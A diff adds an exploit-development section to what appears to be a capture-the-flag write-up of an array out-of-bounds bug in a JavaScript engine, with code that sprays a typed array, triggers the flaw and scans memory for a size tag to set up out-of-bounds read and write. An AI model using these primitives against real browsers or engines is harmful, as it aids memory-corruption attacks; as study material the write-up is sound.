@@ -141,6 +141,53 @@ Triggering the vulnerability :
 
 [1.png]
 
+# 2. Exploit development
+
+(major reference of my exploit is from https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/)
+
+The first step is to create an array, a mark it with 0x71717171 for easy to debug
+```js
+var oob_Array=new Array(1)
+oob_Array[0]=0x71717171
+```
+
+After that, open another 0x2000 array and assign each array object with 0x4141414141, then trigger the oob vulnerability
+
+```js
+var uint32_Array=new Uint32Array(0x2000)
+for(var i=0; i<0x2000; i=i+1) {uint32_Array[i]=0x4141414141}
+oob_Array.blaze()
+```
+
+[2.png]
+
+Basically the 0xfff88000 in front of 0x71717171 are type indicator of 0x71717171
+
+lets find where are the "A" located in the memory.
+
+
+[3.png]
+
+We can observe the memory structure of the oob_Array as follows (details could read bpsec 's blog post for detail explanation):
+
+
+The 0x2000 on the memory is the size of our array object.
+
+Next step is to use 0x2000 as a flag to leak out the index on the oob_Array,such that we can do out of bound read write by replacing the pointer to the "A" array with the memory address we wanna read 
+
+```
+//find the function size tag(0x2000) from the oob array
+uint32_baseaddress_offset=0
+for (i=0; i<0x2000; i++)
+{
+        if(oob_Array[i]==0x2000)
+        {
+                print('uInt32Array found');
+                uint32_baseaddress_offset=i+2
+                break;
+        }
+}
+```
 
 # Reference
 
